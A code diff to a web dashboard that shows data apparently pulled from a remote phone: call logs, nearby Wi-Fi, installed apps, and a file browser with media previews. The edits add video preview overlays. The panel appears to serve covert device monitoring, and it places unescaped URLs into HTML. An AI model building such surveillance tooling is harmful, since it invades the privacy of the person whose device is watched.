@@ -264,7 +264,7 @@ function initializeDataFeedListeners(uid) {
         const calls = d.calls||[]; const c = document.getElementById('calls-count'); if(c) c.textContent = calls.length;
         const f = document.getElementById('calls-feed'); if(!f) return;
         if(!calls.length){f.innerHTML='No call data yet';return;}
-        f.innerHTML = calls.map(c=>{const i=c.type==='incoming'?'📥':c.type==='outgoing'?'📤':'❌';const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;}).join('');
+        f.innerHTML = calls.map(c=>{const i=c.type==='incoming'?'📥':c.type==='outgoing'?'📤':'';const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;}).join('');
     });
     listenToFeed(uid, 'calls_live', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,10);
@@ -281,7 +281,7 @@ function initializeDataFeedListeners(uid) {
         const nets = d.nearby_networks||[]; const c = document.getElementById('wifi-count'); if(c) c.textContent = nets.length;
         const f = document.getElementById('wifi-feed'); if(!f) return;
         let h = `<div class="feed-item" style="color:#00ff88;">Connected: <strong>${esc(d.current_ssid||'Not connected')}</strong> (RSSI: ${d.current_rssi||'--'})</div>`;
-        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'';const l=n.is_secured?'🔒':'';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
+        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'':'';const l=n.is_secured?'🔒':'';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
         f.innerHTML = h;
     });
     listenToFeed(uid, 'installed_apps', (d) => {
@@ -374,7 +374,7 @@ function initializeDataFeedListeners(uid) {
         o.textContent = text;
     });
 
-    // ── FILE BROWSER WITH NAVIGATION + IMAGE PREVIEWS ─
+    // ── FILE BROWSER WITH NAVIGATION + IMAGE/VIDEO PREVIEWS ─
     listenToFeed(uid, 'file_browser', (d) => {
         const o = document.getElementById('file-output'); if(!o||!d) return;
         o.style.display = 'block';
@@ -388,9 +388,17 @@ function initializeDataFeedListeners(uid) {
         if(d.is_file) {
             let html = '<div style="margin-bottom:10px;">';
             if(d.preview_url) {
-                html += '<img src="' + d.preview_url + '" style="width:100%;max-width:300px;border-radius:6px;margin-bottom:8px;cursor:pointer;display:block;" onclick="window.open(this.src,\'_blank\')" loading="lazy">';
+                var isVid = (d.file_type === 'video');
+                html += '<div style="position:relative;display:inline-block;cursor:pointer;" onclick="window.open(\'' + d.preview_url.replace(/'/g,"\\'") + '\',\'_blank\')">';
+                html += '<img src="' + d.preview_url + '" style="width:100%;max-width:300px;border-radius:6px;display:block;" loading="lazy">';
+                if(isVid) {
+                    html += '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:40px;height:40px;background:rgba(0,0,0,0.6);border-radius:50%;display:flex;align-items:center;justify-content:center;">';
+                    html += '<div style="width:0;height:0;border-left:14px solid #fff;border-top:9px solid transparent;border-bottom:9px solid transparent;margin-left:3px;"></div>';
+                    html += '</div>';
+                }
+                html += '</div>';
             }
-            html += '<div style="font-size:14px;color:#fff;margin-bottom:6px;">' + esc(d.name||'File') + '</div>';
+            html += '<div style="font-size:14px;color:#fff;margin-bottom:6px;margin-top:8px;">' + esc(d.name||'File') + '</div>';
             html += '<div style="color:#888;font-size:11px;">Size: ' + (d.size_formatted||'?') + '</div>';
             html += '<div style="color:#888;font-size:11px;">Type: ' + (d.file_type||'unknown') + '</div>';
             html += '<div style="color:#888;font-size:11px;">Path: ' + esc(d.absolute_path||d.current_path||'') + '</div>';
@@ -408,10 +416,11 @@ function initializeDataFeedListeners(uid) {
             return;
         }
 
-        // Directory listing with icons, previews, hidden file support
+        // Directory listing
         let html = '<div style="color:#00ff88;font-size:13px;margin-bottom:4px;">📂 ' + esc(d.current_path||'/') + '</div>';
         html += '<div style="color:#666;font-size:10px;margin-bottom:10px;">' + (d.total_dirs||0) + ' folders • ' + (d.total_files||0) + ' files';
         if(d.shown_files !== undefined && d.total_files > d.shown_files) html += ' (showing ' + d.shown_files + ')';
+        if(d.previews_generated) html += ' • ' + d.previews_generated + ' previews';
         html += '</div>';
 
         var entries = d.entries || [];
@@ -432,7 +441,15 @@ function initializeDataFeedListeners(uid) {
             } else {
                 html += '<div style="padding:6px 0;border-bottom:1px solid #111;display:flex;gap:10px;align-items:center;' + hiddenStyle + '">';
                 if(e.preview_url) {
-                    html += '<img src="' + e.preview_url + '" style="width:50px;height:50px;object-fit:cover;border-radius:4px;flex-shrink:0;cursor:pointer;" onclick="event.stopPropagation();window.open(this.src,\'_blank\')" loading="lazy">';
+                    var isVideoFile = (e.icon === '🎬');
+                    html += '<div style="position:relative;width:50px;height:50px;flex-shrink:0;cursor:pointer;" onclick="event.stopPropagation();window.open(\'' + e.preview_url.replace(/'/g,"\\'") + '\',\'_blank\')">';
+                    html += '<img src="' + e.preview_url + '" style="width:50px;height:50px;object-fit:cover;border-radius:4px;display:block;" loading="lazy">';
+                    if(isVideoFile) {
+                        html += '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:20px;height:20px;background:rgba(0,0,0,0.6);border-radius:50%;display:flex;align-items:center;justify-content:center;">';
+                        html += '<div style="width:0;height:0;border-left:8px solid #fff;border-top:5px solid transparent;border-bottom:5px solid transparent;margin-left:2px;"></div>';
+                        html += '</div>';
+                    }
+                    html += '</div>';
                 } else {
                     var iconBg = '#1a1a2e';
                     if(e.icon === '🎵') iconBg = '#1a0a2e';
